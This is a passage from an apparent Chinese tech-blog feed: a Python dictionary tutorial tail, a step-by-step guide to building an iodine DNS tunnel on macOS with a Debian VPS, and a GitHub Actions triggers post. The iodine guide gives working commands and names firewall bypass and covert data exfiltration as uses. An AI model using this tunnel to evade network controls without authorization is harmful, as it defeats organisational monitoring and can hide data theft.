class="string">&quot;age&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回并移除最后插入的价值对</span></span><br><span class="line"><span class="comment"># （在 Python 3.7 之前，移除任意键值对）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;popped item:&quot;</span>, my_dict.popitem())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(my_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear() : 移除所有键值对</span></span><br><span class="line"><span class="comment"># my_dict.clear()</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">popped value: <span class="number">28</span></span><br><span class="line">popped item: (<span class="string">&#x27;city&#x27;</span>, <span class="string">&#x27;New York&#x27;</span>)</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Max&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>检查键</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">28</span>, <span class="string">&quot;city&quot;</span>:<span class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line"><span class="comment"># 使用 if .. in ..</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;name&quot;</span> <span class="keyword">in</span> my_dict:</span><br><span class="line">    <span class="built_in">print</span>(my_dict[<span class="string">&quot;name&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 try except</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(my_dict[<span class="string">&quot;firstname&quot;</span>])</span><br><span class="line"><span class="keyword">except</span> KeyError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No key found&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Max</span><br><span class="line">No key found</span><br></pre></td></tr></table></figure><h3><span id="bian-li-zi-dian">遍历字典</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 遍历键</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> my_dict:</span><br><span class="line">    <span class="built_in">print</span>(key, my_dict[key])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历键</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> my_dict.keys():</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历值</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> my_dict.values():</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历键和值</span></span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> my_dict.items():</span><br><span class="line">    <span class="built_in">print</span>(key, value)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name Max</span><br><span class="line">age <span class="number">28</span></span><br><span class="line">city New York</span><br><span class="line">name</span><br><span class="line">age</span><br><span class="line">city</span><br><span class="line">Max</span><br><span class="line"><span class="number">28</span></span><br><span class="line">New York</span><br><span class="line">name Max</span><br><span class="line">age <span class="number">28</span></span><br><span class="line">city New York</span><br></pre></td></tr></table></figure><h3><span id="fu-zhi-zi-dian">复制字典</span></h3><p>复制索引时请注意。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict_org = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">28</span>, <span class="string">&quot;city&quot;</span>:<span class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这只复制字典的引用，需要小心</span></span><br><span class="line">dict_copy = dict_org</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改复制字典也会影响原来的字典</span></span><br><span class="line">dict_copy[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;Lisa&quot;</span></span><br><span class="line"><span class="built_in">print</span>(dict_copy)</span><br><span class="line"><span class="built_in">print</span>(dict_org)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 copy() 或者 dict(x) 来真正复制字典</span></span><br><span class="line">dict_org = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">28</span>, <span class="string">&quot;city&quot;</span>:<span class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">dict_copy = dict_org.copy()</span><br><span class="line"><span class="comment"># dict_copy = dict(dict_org)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在修改复制字典不会影响原来的字典</span></span><br><span class="line">dict_copy[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;Lisa&quot;</span></span><br><span class="line"><span class="built_in">print</span>(dict_copy)</span><br><span class="line"><span class="built_in">print</span>(dict_org)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Max&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="he-bing-liang-ge-zi-dian">合并两个字典</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 update() 方法合两个字典</span></span><br><span class="line"><span class="comment"># 存在的键会被覆盖，新键会被添加</span></span><br><span class="line">my_dict = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">28</span>, <span class="string">&quot;email&quot;</span>:<span class="string">&quot;max@xyz.com&quot;</span>&#125;</span><br><span class="line">my_dict_2 = <span class="built_in">dict</span>(name=<span class="string">&quot;Lisa&quot;</span>, age=<span class="number">27</span>, city=<span class="string">&quot;Boston&quot;</span>)</span><br><span class="line"></span><br><span class="line">my_dict.update(my_dict_2)</span><br><span class="line"><span class="built_in">print</span>(my_dict)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">27</span>, <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;max@xyz.com&#x27;</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Boston&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="ke-neng-de-jian-lei-xing">可能的键类型</span></h3><p>任何不可变的类型（例如字符串或数字）都可以用作键。 另外，如果元组仅包含不可变元素，则可以使用它作为键。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用数字做键，但要小心</span></span><br><span class="line">my_dict = &#123;<span class="number">3</span>: <span class="number">9</span>, <span class="number">6</span>: <span class="number">36</span>, <span class="number">9</span>:<span class="number">81</span>&#125;</span><br><span class="line"><span class="comment"># 不要将键误认为是列表的索引，例如，在这里无法使用 my_dict[0]</span></span><br><span class="line"><span class="built_in">print</span>(my_dict[<span class="number">3</span>], my_dict[<span class="number">6</span>], my_dict[<span class="number">9</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用仅包含不可变元素（例如数字，字符串）的元组</span></span><br><span class="line">my_tuple = (<span class="number">8</span>, <span class="number">7</span>)</span><br><span class="line">my_dict = &#123;my_tuple: <span class="number">15</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(my_dict[my_tuple])</span><br><span class="line"><span class="comment"># print(my_dict[8, 7])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不能使用列表，因为列表是可变的，会抛出错误：</span></span><br><span class="line"><span class="comment"># my_list = [8, 7]</span></span><br><span class="line"><span class="comment"># my_dict = &#123;my_list: 15&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">9</span> <span class="number">36</span> <span class="number">81</span></span><br><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure><h3><span id="qian-tao-zi-dian">嵌套字典</span></h3><p>值也可以是容器类型（例如列表，元组，字典）。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dict_1 = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">28</span>&#125;</span><br><span class="line">my_dict_2 = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alex&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">25</span>&#125;</span><br><span class="line">nested_dict = &#123;<span class="string">&quot;dictA&quot;</span>: my_dict_1,</span><br><span class="line">               <span class="string">&quot;dictB&quot;</span>: my_dict_2&#125;</span><br><span class="line"><span class="built_in">print</span>(nested_dict)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;dictA&#x27;</span>: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Max&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>&#125;, <span class="string">&#x27;dictB&#x27;</span>: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Alex&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      03. 字典 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>在 Mac OS X 上使用 iodine 配置 DNS 隧道</title>
    <link href="https://qiwihui.com/qiwihui-blog-53/"/>
    <id>https://qiwihui.com/qiwihui-blog-53/</id>
    <published>2022-08-13T01:54:25.430Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>DNS 隧道，是隐蔽信道的一种，通过将其他协议封装在DNS协议中传输建立通信。</p></blockquote><p>本文是在 Mac OS X 上实践的 DNS 隧道的一个记录，关于这个方法的原理，请具体参考 <a href="https://cloud.tencent.com/developer/article/1040276">DNS Tunneling及相关实现</a>。</p><span id="more"></span><h2><span id="an-zhuang-he-pei-zhi">安装和配置</span></h2><h3><span id="pei-zhi-yu-ming">配置域名</span></h3><p>准备一台 VPS 以及一个域名（比如 <code>qiwihui.com</code>），在域名的 DNS 配置中添加两条记录：</p><table><thead><tr><th>Name</th><th>Type</th><th>TTL</th><th>Data</th></tr></thead><tbody><tr><td>dns</td><td>A</td><td>1h</td><td><code>vps-ip</code></td></tr><tr><td>dt</td><td>NS</td><td>1h</td><td><a href="http://dns.qiwihui.com">dns.qiwihui.com</a></td></tr></tbody></table><h3><span id="fu-wu-duan">服务端</span></h3><p>以 Debian 系统为例，安装：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install iodine</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ iodined -f -c -P password 172.18.0.1 dt.qiwihui.com </span><br><span class="line">Opened dns0</span><br><span class="line">Setting IP of dns0 to 172.18.0.1</span><br><span class="line">Setting MTU of dns0 to 1130</span><br><span class="line">Opened IPv4 UDP socket</span><br><span class="line">Listening to dns <span class="keyword">for</span> domain dt.qiwihui.com</span><br></pre></td></tr></table></figure><p>其中，<code>password</code> 是客户端和服务器之前的密码，<code>172.18.0.1</code> 为虚拟局域网的IP地址，可自行设定，但不要与现有网络重复了。此时，服务端已经就绪。</p><h3><span id="ke-hu-duan-ben-di-an-zhuang-iodine">客户端（本地）安装 <code>iodine</code></span></h3><ol><li>本地安装 <code>tuntap</code></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew cask install tuntap</span><br></pre></td></tr></table></figure><ol start="2"><li>安装 <code>iodine</code></li></ol><p>因为官方没有提供 Mac OS X 的可执行文件，需要从源码编译，或者使用我已经设置好的 Homebrew tap 进行安装。从源码编译：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -c http://code.kryo.se/iodine/iodine-0.7.0.tar.gz</span><br><span class="line">tar zxvf iodine-0.7.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> iodine-0.7.0</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>或者使用 Homebrew：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew tap qiwihui/core</span><br><span class="line">brew install qiwihui/core/iodine</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo iodine -f -P password dns.qiwihui.com dt.qiwihui.com</span><br><span class="line">Opened /dev/tun0</span><br><span class="line">Opened IPv4 UDP socket</span><br><span class="line">Sending DNS queries <span class="keyword">for</span> dt.qiwihui.com to &lt;vps-ip&gt;</span><br><span class="line">Autodetecting DNS query <span class="built_in">type</span> (use -T to override).</span><br><span class="line">Using DNS <span class="built_in">type</span> NULL queries</span><br><span class="line">Version ok, both using protocol v 0x00000502. You are user <span class="comment">#1</span></span><br><span class="line">Setting IP of tun0 to 172.18.0.3</span><br><span class="line">Adding route 172.18.0.0/27 to 172.18.0.3</span><br><span class="line">add net 172.18.0.0: gateway 172.18.0.3</span><br><span class="line">Setting MTU of tun0 to 1130</span><br><span class="line">Server tunnel IP is 172.18.0.1</span><br><span class="line">Testing raw UDP data to the server (skip with -r).</span><br><span class="line">Server is at 10.170.0.3, trying raw login: ....failed</span><br><span class="line">Retrying EDNS0 support <span class="built_in">test</span>...</span><br><span class="line">Using EDNS0 extension</span><br><span class="line">Switching upstream to codec Base128</span><br><span class="line">Server switched upstream to codec Base128</span><br><span class="line">No alternative downstream codec available, using default (Raw)</span><br><span class="line">Switching to lazy mode <span class="keyword">for</span> low-latency</span><br><span class="line">Server switched to lazy mode</span><br><span class="line">Autoprobing max downstream fragment size... (skip with -m fragsize)</span><br><span class="line">768 ok.. ...1152 not ok.. 960 ok.. 1056 ok.. 1104 ok.. 1128 ok.. 1140 ok.. will use 1140-2=1138</span><br><span class="line">Setting downstream fragment size to max 1138...</span><br><span class="line">Retrying <span class="built_in">set</span> fragsize...</span><br><span class="line">Retrying <span class="built_in">set</span> fragsize...</span><br><span class="line">Connection setup complete, transmitting data.</span><br></pre></td></tr></table></figure><p>此时，客户端配置完成。</p><h3><span id="ce-shi-he-shi-yong">测试和使用</span></h3><p>在本地尝试 ping 172.18.0.1 即可：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ping 172.18.0.1</span><br><span class="line">PING 172.18.0.1 (172.18.0.1): 56 data bytes</span><br><span class="line">64 bytes from 172.18.0.1: icmp_seq=0 ttl=64 time=233.914 ms</span><br><span class="line">64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=232.870 ms</span><br><span class="line">64 bytes from 172.18.0.1: icmp_seq=2 ttl=64 time=230.201 ms</span><br><span class="line">64 bytes from 172.18.0.1: icmp_seq=3 ttl=64 time=268.602 ms</span><br><span class="line">64 bytes from 172.18.0.1: icmp_seq=4 ttl=64 time=230.573 ms</span><br><span class="line">^C</span><br><span class="line">--- 172.18.0.1 ping statistics ---</span><br><span class="line">5 packets transmitted, 5 packets received, 0.0% packet loss</span><br><span class="line">round-trip min/avg/max/stddev = 230.201/239.232/268.602/14.751 ms</span><br></pre></td></tr></table></figure><p>这时，只要通过这个 DNS 隧道就可就传递其他数据了。</p><h2><span id="yong-tu">用途</span></h2><p>当防火墙限制了一些网站的访问，但是能进行 DNS 查询时，可使用这种方法进行绕过，比如在公司，又或者在某些国家，犯罪分子也常用这中方式进行内网数据传出。</p><h2><span id="can-kao">参考</span></h2><ul><li><a href="http://code.kryo.se/iodine/%EF%BC%9Aiodine">http://code.kryo.se/iodine/：iodine</a> 官方网站，<a href="http://kryo.se">kryo.se</a>: iodine (IP-over-DNS, IPv4 over DNS tunnel)</li><li><a href="https://github.com/yarrick/iodine%EF%BC%9AOfficial">https://github.com/yarrick/iodine：Official</a> git repo for iodine dns tunnel</li><li><a href="https://cloud.tencent.com/developer/article/1040276">DNS Tunneling及相关实现</a></li><li><a href="http://jeremy5189.logdown.com/posts/263029-iodine-ip-over-dns">iodine - IP over DNS</a></li><li><a href="http://wiki.attie.co.uk/wiki/Tunnel_IP_through_DNS">Tunnel IP through DNS</a></li></ul><h3><span id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-486480977"><strong>shaohuihu</strong></a> on: <strong>4/25/2019</strong></p></blockquote><p>mac上使用 iodined: open_tun: Failed to open tunneling device: No such file or directory楼主mac上如何解决的TUN/TAP?</p><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-486482390"><strong>qiwihui</strong></a> on: <strong>4/25/2019</strong></p></blockquote><h2><span id="shaohuihu-ni-xu-yao-tuntap-brew-cask-install-tuntap">@shaohuihu 你需要tuntap：<code>brew cask install tuntap</code></span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-486503799"><strong>shaohuihu</strong></a> on: <strong>4/25/2019</strong></p></blockquote><h2><span id="qing-wen-zhe-ge-dns-fu-wu-qi-yi-ji-iodine-ke-hu-duan-fu-wu-duan-zi-ji-da-jian-zai-ben-di-hao-shi-bu">请问  这个dns服务器 以及iodine 客户端 服务端自己搭建在本地好使不？</span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-486529656"><strong>qiwihui</strong></a> on: <strong>4/25/2019</strong></p></blockquote><p>@shaohuihu  在直连模式下可看youtube 720p, 中继模式下没试过，看相关文章速度也是在其他几种DNS tunneling中是最快的。</p><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-486972412"><strong>shaohuihu</strong></a> on: <strong>4/26/2019</strong></p></blockquote><h2><span id="ke-fu-duan-he-fu-wu-duan-du-pei-zhi-hao-hou-ping-ip-bao-cuo-ping-sendto-no-buffer-space-available-qing-wen-zhe-ge-shi-shi-me-yuan-yin-ni-qiwihui">客服端和服务端都配置好后。ping ip 报错：ping: sendto: No buffer space available 请问这个是什么原因呢？@qiwihui</span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-487355342"><strong>shaohuihu</strong></a> on: <strong>4/28/2019</strong></p></blockquote><h2><span id="qiwihui-zhe-ge-kun-rao-liao-hao-jiu-liao-fu-wu-duan-wo-ye-check-liao-shi-dui-de-ke-hu-duan-ye-lian-jie-wan-cheng-53-duan-kou-wo-ye-kai-fang-liao-fu-wu-duan-he-ke-hu-duan-ban-ben-ye-shi-yi-yang-de-jiu-shi-ping-bu-tong-bu-neng-tong-xin-ni-zhi-dao-wei-shi-me-ma">@qiwihui  这个困扰了好久了 服务端我也check了 是对的，客户端也连接完成53端口我也开放了，服务端和客户端版本也是一样的，就是ping 不通。不能通信，你知道为什么吗</span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-487360896"><strong>qiwihui</strong></a> on: <strong>4/28/2019</strong></p></blockquote><p>@shaohuihu 这个问题原因很多，可是试试重置网卡</p><ol><li>确定使用的网卡</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo route -n get 172.18.0.1</span></span><br><span class="line">   route to: 172.18.0.1</span><br><span class="line">destination: 172.18.0.0</span><br><span class="line">       mask: 255.255.255.224</span><br><span class="line">    gateway: 172.18.0.2</span><br><span class="line">  interface: tun0</span><br><span class="line">      flags: &lt;UP,GATEWAY,DONE,STATIC,PRCLONING&gt;</span><br><span class="line"> recvpipe  sendpipe  ssthresh  rtt,msec    rttvar  hopcount      mtu     expire</span><br><span class="line">       0         0         0         0         0         0      1130         0 </span><br></pre></td></tr></table></figure><ol start="2"><li>重置</li></ol><h2><span id="sudo-ifconfig-tun0-downsudo-ifconfig-tun0-up"><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ifconfig tun0 down</span><br><span class="line">sudo ifconfig tun0 up</span><br></pre></td></tr></table></figure></span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-487361085"><strong>qiwihui</strong></a> on: <strong>4/28/2019</strong></p></blockquote><p>可以参考：</p><ul><li><a href="https://docs.netgate.com/pfsense/en/latest/routing/no-buffer-space-available.html">https://docs.netgate.com/pfsense/en/latest/routing/no-buffer-space-available.html</a></li><li><a href="https://odino.org/ping-sendto-no-buffer-space-available-with-du-dnses/">https://odino.org/ping-sendto-no-buffer-space-available-with-du-dnses/</a></li></ul><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-490726534"><strong>badtoken</strong></a> on: <strong>5/9/2019</strong></p></blockquote><blockquote><p>@shaohuihu 这个问题原因很多，可是试试重置网卡</p><ol><li>确定使用的网卡</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo route -n get 172.18.0.1</span></span><br><span class="line">   route to: 172.18.0.1</span><br><span class="line">destination: 172.18.0.0</span><br><span class="line">       mask: 255.255.255.224</span><br><span class="line">    gateway: 172.18.0.2</span><br><span class="line">  interface: tun0</span><br><span class="line">      flags: &lt;UP,GATEWAY,DONE,STATIC,PRCLONING&gt;</span><br><span class="line"> recvpipe  sendpipe  ssthresh  rtt,msec    rttvar  hopcount      mtu     expire</span><br><span class="line">       0         0         0         0         0         0      1130         0 </span><br></pre></td></tr></table></figure><ol><li>重置</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ifconfig tun0 down</span><br><span class="line">sudo ifconfig tun0 up</span><br></pre></td></tr></table></figure></blockquote><p>你好，请问有win的解决方案吗。我现在也是ping不通，win客户端ping隧道的服务端内网地址，死活不通（ping隧道服务端外网地址是通的）</p><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-490766765"><strong>qiwihui</strong></a> on: <strong>5/9/2019</strong></p></blockquote><p>@badtoken 应该也有吧，比如这个 <a href="https://kb.wisc.edu/helpdesk/page.php?id=6653">https://kb.wisc.edu/helpdesk/page.php?id=6653</a> ，具体我也没有试过</p>]]></content>
    
    <summary type="html">
    
      在 Mac OS X 上使用 iodine 配置 DNS 隧道
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第1天：CI/CD 触发器</title>
    <link href="https://qiwihui.com/qiwihui-blog-84/"/>
    <id>https://qiwihui.com/qiwihui-blog-84/</id>
    <published>2022-08-13T01:54:25.430Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>GitHub Actions是一个独立的系统：它提供了 CI/CD 构建功能──能够构建和测试 Pull Request 并合并到你的master分支中──但它不只限于构建系统。 它已经集成到GitHub中，并且 <a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/events-that-trigger-workflows">只要你的项目库中发生任何事件</a>（例如正在创建发行版或正在评论问题），都可以触发并运行工作流。</p><p>我将在这个月更多地讨论那些项目库自动化方案，但是你要知道，这种灵活性将有助于理解如何进行 CI/CD 构建设置。 GitHub Actions 允许你定义一个 <em>触发器</em> 来控制工作流程的运行时间。每当你的项目库中发生与该触发器匹配的操作时，工作流运行都会进入排队队列中准备。</p><span id="more"></span><p>对于 CI/CD 工作流，我喜欢使用 <a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/events-that-trigger-workflows#push-event-push">push</a> 和 <a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/events-that-trigger-workflows#pull-request-event-pull_request">pull_request</a> 触发器，并将其范围限定在我感兴趣的分支上。例如：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">  <span class="attr">pull_request:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>这个触发器将在对master分支进行任何更改时运行你的工作流──（即使它的名字是 <code>push</code> 触发器，也将在你运行 <code>git push</code> 或将 pull request 合并到 master 分支时运行）。对于针对master分支打开的任何 pull request，工作流也将运行，并且将在 pull request 中向你显示验证。</p><p><img src="https://user-images.githubusercontent.com/3297411/77157504-749cbd80-6adc-11ea-8fd5-17d745208029.png" alt="image"></p><p>如果你熟悉YAML语法，就可能会注意到分支采用数组。 因此，你可以轻松地设置工作流在多个分支中运行，这在你维护单独的发布轨道追踪时非常有用。 例如：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;releases/**&#x27;</span></span><br><span class="line">  <span class="attr">pull_request:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;releases/**&#x27;</span></span><br></pre></td></tr></table></figure><p>每当对 <code>master</code> 分支或名称 <a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#onpushpull_requestbranchestags">以 <code>releases/</code> 开头的分支</a> 打开 pull request 时，将运行你的工作流。</p><p>通过 <code>push</code> 和 <code>pull_request</code> 触发器，可以轻松设置 CI/CD 样式的工作流程来验证 pull request，并使用 GitHub Actions 合并到你的 master 分支中。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_1_cicd_triggers.html">https://www.edwardthomson.com/blog/github_actions_1_cicd_triggers.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第1天：CI/CD 触发器
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第11天：密码（Secrets）</title>
    <link href="https://qiwihui.com/qiwihui-blog-94/"/>
    <id>https://qiwihui.com/qiwihui-blog-94/</id>
    <published>2022-08-13T01:54:25.430Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
